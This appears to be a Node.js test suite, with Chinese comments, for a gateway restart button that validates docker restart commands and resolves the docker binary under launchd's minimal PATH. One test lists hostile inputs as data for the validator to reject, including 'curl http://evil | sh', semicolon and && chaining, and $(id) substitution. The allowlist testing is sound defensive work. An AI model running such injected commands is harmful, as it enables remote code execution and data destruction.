// 服务控制（「↻ 重启网关」按钮）宿主侧用例。
//
// 现场背景：Docker.app 装着、chanhub2api 容器跑得好好的，但 /usr/local/bin 下
// **没有** docker 软链，而 dsh 是 launchd 拉起的（PATH 只有
// /usr/bin:/bin:/usr/sbin:/sbin）→ 点重启直接报
// `/bin/sh: docker: command not found`。命令本身没错，是找不到二进制。
//
// 这组用例锁的就是这条链：命令形状校验 → 二进制解析（PATH + 已知安装位）→
// 子进程 env（PATH/HOME）→ 真跑一次（拿不存在的容器名，确保不会误伤网关）。

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { chmodSync, mkdtempSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  buildServiceEnv,
  inspectRestartCommand,
  resolveServiceBinary,
  runServiceControl,
  SERVICE_BIN_HINT_DIRS,
} from '../lib/index.js';

/** 造一个临时可执行文件，用于确定性地验证「路径解析」而不是碰真实 docker。 */
function makeFakeBin(name = 'fake-docker') {
  const dir = mkdtempSync(join(tmpdir(), 'dsh-chanhub-svc-'));
  const file = join(dir, name);
  writeFileSync(file, '#!/bin/sh\necho fake\n');
  chmodSync(file, 0o755);
  return { dir, file };
}

/**
 * 临时改写 process.env.PATH / HOME，回调结束后恢复（避免污染同一进程里的其他用例）。
 * 必须 async + await：否则 finally 会在被测的异步函数读到 PATH 之前就把它还原。
 */
async function withEnv(patch, fn) {
  const saved = {};
  for (const key of Object.keys(patch)) {
    saved[key] = process.env[key];
    if (patch[key] === undefined) delete process.env[key];
    else process.env[key] = patch[key];
  }
  try {
    return await fn();
  } finally {
    for (const key of Object.keys(saved)) {
      if (saved[key] === undefined) delete process.env[key];
      else process.env[key] = saved[key];
    }
  }
}

test('命令形状白名单：接受四种合法写法', () => {
  for (const command of [
    'docker restart chanhub2api-chanhub2api',
    'docker compose restart chanhub2api',
    'docker compose -f /srv/chanhub/docker-compose.yml restart chanhub2api',
    'docker-compose restart chanhub2api',
    './dev.sh restart',
    '/Applications/Docker.app/Contents/Resources/bin/docker restart chanhub2api',
  ]) {
    const shape = inspectRestartCommand(command);
    assert.equal(shape.ok, true, `应当接受：${command}`);
    assert.ok(typeof shape.bin === 'string' && shape.bin.length > 0);
  }
});

test('命令形状白名单：拒绝非重启动作与 shell 元字符', () => {
  const rejected = [
    ['docker ps', '不是 restart'],
    ['docker rm -f chanhub2api', '危险动作'],
    ['docker restart chanhub2api; rm -rf /tmp/x', '分号拼接'],
    ['docker restart chanhub2api && echo pwned', '&& 拼接'],
    ['docker restart $(id)', '命令替换'],
    ['docker exec chanhub2api sh', 'exec'],
    ['curl http://evil | sh', '完全不在白名单'],
  ];
  for (const [command, why] of rejected) {
    const shape = inspectRestartCommand(command);
    assert.equal(shape.ok, false, `应当拒绝（${why}）：${command}`);
    assert.match(shape.message, /重启命令|元字符/);
  }
});

test('二进制解析：命中 PATH', async () => {
  const { dir, file } = makeFakeBin();
  const found = await withEnv({ PATH: dir }, () => resolveServiceBinary('fake-docker'));
  assert.equal(found, file);
});

test('二进制解析：PATH 里没有时，退到已知安装位（Docker Desktop 自带 CLI）', async () => {
  const dockerBin = await withEnv({ PATH: '/usr/bin:/bin' }, () => resolveServiceBinary('docker'));
  // 没装 docker 的机器（CI）跳过 —— 这条断言只对「装了但不在 PATH 上」的环境有意义。
  if (!dockerBin) return;
  assert.ok(SERVICE_BIN_HINT_DIRS.some((dir) => dockerBin.startsWith(`${dir}/`)), dockerBin);
});

test('二进制解析：绝对路径与相对路径', async () => {
  const { file } = makeFakeBin();
  assert.equal(await resolveServiceBinary(file), file);
  assert.equal(await resolveServiceBinary('/definitely/not/here/docker'), null);
});

test('二进制解析：找不着就返回 null（不是抛异常）', async () => {
  assert.equal(await resolveServiceBinary('dsh-chanhub-no-such-binary-xyz'), null);
});

test('子进程 env：补进二进制所在目录，且不重复追加已在 PATH 里的目录', async () => {
  const { dir } = makeFakeBin();
  const env = await withEnv({ PATH: `/usr/bin:/bin:${dir}` }, () => buildServiceEnv(join(dir, 'x')));
  assert.equal(env.PATH, `/usr/bin:/bin:${dir}`, '已存在则保持原顺序，不把它顶到最前');

  const env2 = await withEnv({ PATH: '/usr/bin:/bin' }, () => buildServiceEnv(join(dir, 'x')));
  assert.equal(env2.PATH.split(':')[0], dir, '不在 PATH 里则前置');
});

test('子进程 env：HOME 缺失时补上（否则 docker CLI 找不到 desktop-linux 的 socket）', async () => {
  const { dir } = makeFakeBin();
  const env = await withEnv({ HOME: undefined }, () => buildServiceEnv(join(dir, 'x')));
  assert.equal(env.HOME, homedir());
});

test('未开启服务控制 / 未配置命令：拒绝且给出可操作提示', async () => {
  const disabled = await runServiceControl({}, { allowServiceControl: false });
  assert.equal(disabled.ok, false);
  assert.equal(disabled.code, 'disabled');

  const noCommand = await runServiceControl({}, { allowServiceControl: true, restartCommand: '  ' });
  assert.equal(noCommand.ok, false);
  assert.equal(noCommand.code, 'no-command');

  const notAllowed = await runServiceControl(
    { command: 'rm -rf /tmp/whatever' },
    { allowServiceControl: true },
  );
  assert.equal(notAllowed.code, 'command-not-allowed');
});

test('找不到二进制：返回 binary-not-found 并列出搜过的目录（不是 shell 的 command not found）', async () => {
  const result = await withEnv({ PATH: '/usr/bin:/bin' }, async () =>
    runServiceControl(
      { command: 'docker restart chanhub2api' },
      { allowServiceControl: true },
    ),
  );
  // 本机装了 Docker Desktop 时应解析成功；只有真的没装 docker 才会走到 not-found 分支。
  if (result.code === 'binary-not-found') {
    assert.equal(result.ok, false);
    assert.match(result.message, /找不到可执行文件|Docker Desktop/);
    assert.ok(Array.isArray(result.searched) && result.searched.length > 0);
  } else {
    assert.equal(result.code, 'command-failed', '能找到 docker 时，不该报找不到二进制');
  }
});

test('真跑一次：PATH 被掏空也能执行到 docker（回归 command not found）', async (t) => {
  const dockerBin = await resolveServiceBinary('docker');
  if (!dockerBin) {
    t.skip('本机没有 docker CLI，跳过真机执行用例');
    return;
  }
  // 关键回归点：launchd 给的最小 PATH 里没有 docker（真机 /usr/local/bin 也没软链）。
  const result = await withEnv({ PATH: '/usr/bin:/bin:/usr/sbin:/sbin' }, async () =>
    runServiceControl(
      // 故意用不存在的容器名：只会让 docker 报错退出，不会碰到真实网关。
      { command: 'docker restart __dsh_chanhub_no_such_container__' },
      { allowServiceControl: true },
    ),
  );
  assert.notEqual(result.code, 'binary-not-found', 'PATH 被掏空也必须找到 docker');
  assert.equal(result.code, 'command-failed', '容器不存在，docker 应当非 0 退出');
  assert.ok(result.binPath, '应回传解析到的二进制路径');
  assert.doesNotMatch(
    `${result.stderr ?? ''}${result.message ?? ''}`,
    /command not found/,
    '不该再出现 command not found —— 那正是本次要修的故障',
  );
});
